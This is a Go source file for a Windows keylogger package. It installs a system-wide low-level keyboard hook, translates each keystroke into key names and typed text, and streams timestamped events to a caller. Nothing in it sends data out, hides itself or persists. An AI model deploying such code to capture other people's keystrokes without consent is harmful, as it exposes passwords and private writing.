//go:build windows

package keylogger

import (
	"context"
	"fmt"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/lxn/win"
)

type windowsProvider struct{}

type windowsHookSession struct {
	ctx       context.Context
	cancel    context.CancelFunc
	stream    *channelEventStream
	modifiers *windowsModifierState
	hook      win.HHOOK
}

var (
	windowsSessionMu sync.Mutex
	windowsSession   *windowsHookSession
)

func defaultProviderFactory() func() Provider {
	return func() Provider {
		return &windowsProvider{}
	}
}

func (p *windowsProvider) Start(ctx context.Context, cfg StartConfig) (EventStream, error) {
	if ctx == nil {
		ctx = context.Background()
	}

	normalized := cfg.normalize()
	stream := newChannelEventStream(normalized.BufferSize)

	sessionCtx, cancel := context.WithCancel(ctx)
	session := &windowsHookSession{
		ctx:       sessionCtx,
		cancel:    cancel,
		stream:    stream,
		modifiers: &windowsModifierState{},
	}

	ready := make(chan error, 1)

	windowsSessionMu.Lock()
	if windowsSession != nil {
		windowsSessionMu.Unlock()
		cancel()
		stream.Close()
		return nil, fmt.Errorf("keylogger provider already active")
	}
	windowsSession = session
	windowsSessionMu.Unlock()

	go session.run(ready)

	if err := <-ready; err != nil {
		cancel()
		session.cleanup()
		return nil, err
	}

	go func() {
		<-sessionCtx.Done()
		session.cleanup()
	}()

	return stream, nil
}

func (s *windowsHookSession) cleanup() {
	windowsSessionMu.Lock()
	if windowsSession == s {
		windowsSession = nil
	}
	windowsSessionMu.Unlock()
	s.stream.Close()
}

type kbdLLHook struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

var keyboardProc = syscall.NewCallback(func(nCode int32, wParam uintptr, lParam uintptr) uintptr {
	if nCode == win.HC_ACTION {
		windowsSessionMu.Lock()
		session := windowsSession
		windowsSessionMu.Unlock()
		if session != nil {
			event := (*kbdLLHook)(unsafe.Pointer(lParam))
			pressed := wParam == win.WM_KEYDOWN || wParam == win.WM_SYSKEYDOWN
			released := wParam == win.WM_KEYUP || wParam == win.WM_SYSKEYUP
			if pressed || released {
				session.emit(pressed, event)
			}
		}
	}
	return win.CallNextHookEx(0, int32(nCode), wParam, lParam)
})

func (s *windowsHookSession) run(ready chan<- error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	defer s.cancel()

	threadID := win.GetCurrentThreadId()
	hook := win.SetWindowsHookEx(win.WH_KEYBOARD_LL, keyboardProc, win.GetModuleHandle(nil), 0)
	if hook == 0 {
		ready <- ErrProviderUnavailable
		return
	}
	s.hook = hook
	ready <- nil

	quit := make(chan struct{})
	go func() {
		select {
		case <-s.ctx.Done():
			win.PostThreadMessage(threadID, win.WM_QUIT, 0, 0)
		case <-quit:
		}
	}()

	var msg win.MSG
	for {
		ret := win.GetMessage(&msg, 0, 0, 0)
		if ret == 0 || ret == -1 {
			break
		}
		win.TranslateMessage(&msg)
		win.DispatchMessage(&msg)
	}

	close(quit)

	if s.hook != 0 {
		win.UnhookWindowsHookEx(s.hook)
	}
}

func (s *windowsHookSession) emit(pressed bool, data *kbdLLHook) {
	if data == nil {
		return
	}

	vk := data.VkCode
	if isWindowsModifier(vk) {
		s.modifiers.set(vk, pressed)
	}
	alt, ctrl, shift, meta := s.modifiers.snapshot()

	key := windowsKeyName(vk)
	event := CaptureEvent{
		Timestamp: time.Now().UTC(),
		Key:       key,
		RawCode:   fmt.Sprintf("%d", vk),
		ScanCode:  uint16(data.ScanCode),
		Pressed:   pressed,
		Alt:       alt,
		Ctrl:      ctrl,
		Shift:     shift,
		Meta:      meta,
	}

	if pressed {
		if text := windowsKeyText(vk, shift); text != "" {
			event.Text = text
		}
	}

	s.stream.emit(s.ctx, event)
}

type windowsModifierState struct {
	mu    sync.RWMutex
	alt   bool
	ctrl  bool
	shift bool
	meta  bool
}

func (m *windowsModifierState) set(vk uint32, pressed bool) {
	m.mu.Lock()
	switch vk {
	case win.VK_MENU, win.VK_LMENU, win.VK_RMENU:
		m.alt = pressed
	case win.VK_CONTROL, win.VK_LCONTROL, win.VK_RCONTROL:
		m.ctrl = pressed
	case win.VK_SHIFT, win.VK_LSHIFT, win.VK_RSHIFT:
		m.shift = pressed
	case win.VK_LWIN, win.VK_RWIN:
		m.meta = pressed
	}
	m.mu.Unlock()
}

func (m *windowsModifierState) snapshot() (alt, ctrl, shift, meta bool) {
	m.mu.RLock()
	alt, ctrl, shift, meta = m.alt, m.ctrl, m.shift, m.meta
	m.mu.RUnlock()
	return
}

func isWindowsModifier(vk uint32) bool {
	switch vk {
	case win.VK_MENU, win.VK_LMENU, win.VK_RMENU,
		win.VK_CONTROL, win.VK_LCONTROL, win.VK_RCONTROL,
		win.VK_SHIFT, win.VK_LSHIFT, win.VK_RSHIFT,
		win.VK_LWIN, win.VK_RWIN:
		return true
	default:
		return false
	}
}

func windowsKeyText(vk uint32, shift bool) string {
	if name, ok := windowsPrintableKeys[vk]; ok {
		if shift {
			if shifted, ok := windowsShiftedPrintable[vk]; ok {
				return shifted
			}
			return strings.ToUpper(name)
		}
		return name
	}
	return ""
}

func windowsKeyName(vk uint32) string {
	if name, ok := windowsKeyNames[vk]; ok {
		return name
	}
	return fmt.Sprintf("vk_%d", vk)
}

var windowsPrintableKeys = map[uint32]string{
	'A':               "a",
	'B':               "b",
	'C':               "c",
	'D':               "d",
	'E':               "e",
	'F':               "f",
	'G':               "g",
	'H':               "h",
	'I':               "i",
	'J':               "j",
	'K':               "k",
	'L':               "l",
	'M':               "m",
	'N':               "n",
	'O':               "o",
	'P':               "p",
	'Q':               "q",
	'R':               "r",
	'S':               "s",
	'T':               "t",
	'U':               "u",
	'V':               "v",
	'W':               "w",
	'X':               "x",
	'Y':               "y",
	'Z':               "z",
	'0':               "0",
	'1':               "1",
	'2':               "2",
	'3':               "3",
	'4':               "4",
	'5':               "5",
	'6':               "6",
	'7':               "7",
	'8':               "8",
	'9':               "9",
	win.VK_SPACE:      " ",
	win.VK_OEM_1:      ";",
	win.VK_OEM_PLUS:   "=",
	win.VK_OEM_COMMA:  ",",
	win.VK_OEM_MINUS:  "-",
	win.VK_OEM_PERIOD: ".",
	win.VK_OEM_2:      "/",
	win.VK_OEM_3:      "`",
	win.VK_OEM_4:      "[",
	win.VK_OEM_5:      "\\",
	win.VK_OEM_6:      "]",
	win.VK_OEM_7:      "'",
}

var windowsShiftedPrintable = map[uint32]string{
	'1':               "!",
	'2':               "@",
	'3':               "#",
	'4':               "$",
	'5':               "%",
	'6':               "^",
	'7':               "&",
	'8':               "*",
	'9':               "(",
	'0':               ")",
	win.VK_OEM_MINUS:  "_",
	win.VK_OEM_PLUS:   "+",
	win.VK_OEM_1:      ":",
	win.VK_OEM_2:      "?",
	win.VK_OEM_3:      "~",
	win.VK_OEM_4:      "{",
	win.VK_OEM_5:      "|",
	win.VK_OEM_6:      "}",
	win.VK_OEM_7:      "\"",
	win.VK_OEM_COMMA:  "<",
	win.VK_OEM_PERIOD: ">",
}

var windowsKeyNames = map[uint32]string{
	win.VK_ESCAPE:  "escape",
	win.VK_TAB:     "tab",
	win.VK_SHIFT:   "shift",
	win.VK_CONTROL: "ctrl",
	win.VK_MENU:    "alt",
	win.VK_LWIN:    "meta",
	win.VK_RWIN:    "meta",
	win.VK_SPACE:   "space",
	win.VK_BACK:    "backspace",
	win.VK_RETURN:  "enter",
	win.VK_CAPITAL: "capslock",
	win.VK_F1:      "f1",
	win.VK_F2:      "f2",
	win.VK_F3:      "f3",
	win.VK_F4:      "f4",
	win.VK_F5:      "f5",
	win.VK_F6:      "f6",
	win.VK_F7:      "f7",
	win.VK_F8:      "f8",
	win.VK_F9:      "f9",
	win.VK_F10:     "f10",
	win.VK_F11:     "f11",
	win.VK_F12:     "f12",
	win.VK_DELETE:  "delete",
	win.VK_HOME:    "home",
	win.VK_END:     "end",
	win.VK_PRIOR:   "pageup",
	win.VK_NEXT:    "pagedown",
	win.VK_LEFT:    "left",
	win.VK_RIGHT:   "right",
	win.VK_UP:      "up",
	win.VK_DOWN:    "down",
}
